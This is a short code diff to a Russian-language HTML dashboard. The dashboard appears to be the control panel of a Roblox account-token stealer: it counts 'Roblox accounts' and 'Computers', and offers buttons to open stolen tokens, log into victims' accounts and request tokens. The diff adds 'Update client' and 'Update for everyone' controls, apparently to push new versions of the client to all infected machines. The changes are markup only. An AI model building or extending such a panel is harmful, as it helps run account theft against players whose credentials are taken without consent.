@@ -19,6 +19,12 @@
     <div class="stat-card"><div class="stat-label">Roblox Аккаунтов</div><div class="stat-value accent" id="sRoblox">—</div></div>
     <div class="stat-card"><div class="stat-label">Компьютеров</div><div class="stat-value" id="sPCs">—</div></div>
     <div class="stat-card"><div class="stat-label">Последняя отправка</div><div class="stat-value" id="sLast">—</div></div>
+    <div class="stat-card action-card" id="updateAllCard" style="grid-column: span 2; justify-content: center; position: relative;">
+      <div class="stat-label" style="color: var(--danger); font-weight: 700; letter-spacing: 1px;">Обновление</div>
+      <div class="stat-value" id="updateAllVal" style="font-size: 1.25rem; font-weight: 800; display: flex; align-items: center; gap: 8px;">
+        ⚡ Обновить у всех
+      </div>
+    </div>
   </div>
 
     <!-- График статистики -->
@@ -86,6 +92,7 @@
             <button class="modal-btn" id="modalOpenBtn" style="background:rgba(16,185,129,0.15); color:var(--success); border:1px solid rgba(16,185,129,0.3);">📂 Открыть токены</button>
             <button class="modal-btn" id="modalLoginBtn" style="background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.15);">👤 Войти в аккаунт</button>
             <button class="modal-btn" id="modalRequestBtn" style="background:rgba(99,102,241,0.15); color:var(--accent); border:1px solid rgba(99,102,241,0.3);">📡 Запросить токен</button>
+            <button class="modal-btn" id="modalUpdateBtn" style="background:rgba(239,68,68,0.12); color:#ef4444; border:1px solid rgba(239,68,68,0.15);">⚡ Обновить клиент</button>
 
             <button class="modal-btn del-btn" id="modalDeleteBtn">Удалить</button>
           </div>
